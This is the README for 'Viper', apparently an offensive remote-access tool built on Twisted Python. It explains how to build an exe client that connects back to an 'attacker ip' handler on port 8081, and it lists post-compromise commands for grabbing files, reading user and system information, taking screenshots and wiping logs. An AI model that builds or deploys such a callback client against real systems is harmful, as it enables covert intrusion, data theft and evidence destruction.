
Copyright © 2017, [Jinverar owner of black signals](https://github.com/jinverar).
//=> Copyright (c) 2017 jinverar

***VIPER***

"""
This is viper!

Viper is designed in order to retrieve compromised files, processes, and services in case you have to reach out and grab information quickly. 
The viper can also be used for testing exploitation and enumeration for the purpose of learning offensive for defensive actions.

Viper also has team server capabilities *I am still working out bugs but it works great currently with command line

This program was created as a basic function to reach out and grab things fast! Powered by twisted python. 

I have recently added a twisted webserver and chat server for teamdevops

"""

viper has been tested on kali 2.0

***The installer.sh will do this for you***

usage
chmod +x installer.sh
./installer.sh
The installer will back up your ~/.bashrc file and This should do the tricks and get you up and running. 
You will need to verify the installer adds the python path to the end of the ~/.bashrc

Quick help
echo export PYTHONPATH="" >> ~/.bashrc
source ~/.bashrc

***libraries installed and current requirements check install.sh for mods***
python-twisted +16.6;
PyCrypto;
pyOpenSSl;
Zope interface;
python 2.7;
python-2.7.13.msi;
pyinstaller-3.1.1;
future-0.16.0;
wine;
winetricks;

Usage:

***to start the viper console:***

Navigate into the payloads and change the ip address and port number inside the client

$$> chmod +x start-teamserver.sh
$$> ./start-teamserver.sh

***usage:***

start the handler first and then start the client on the target machine

viper main commands:

[*] handler ========= > "starts the viper server and waits for a call back" 

[*] buildfang ========= > "creates a basic exe file from viperclient.py and stores it inside payloads"; 

[*] chatserver ========= > will start your chat server on port 8123. You will have to open a new terminal to connect

[*] stopchat ========= > will tear down the chat server when needed

[*] startweb ========= > starts the webserver

[*] stopweb ========= > stops the webserver


***build fang pre-instructions***

Inside viper client modify these two lines with your local ip address

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(('address you want to connect back to, attacker ip', 8081))


***viper connection commands:***

use these once you get the call back from the client. first you will need to enter in the local host and port number that you assigned to the client before deploying. 

[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt";

[*] getenv       ========= >  prints the system information";

[*] getuid       ========= > Get the user level access of the shell";

[*] SystemInfo   ========= > Get Fingerprint of the system"; todo

[*] capture      ========= > take images of the host machine "; todo

[*] Cover        ========= > Delete all traces of logs"; todo


Contributing

    Fork it!
    Create your feature branch: git checkout -b my-new-feature
    Commit your changes: git commit -am 'Add some feature'
    Push to the branch: git push origin my-new-feature
    Submit a Pull Request
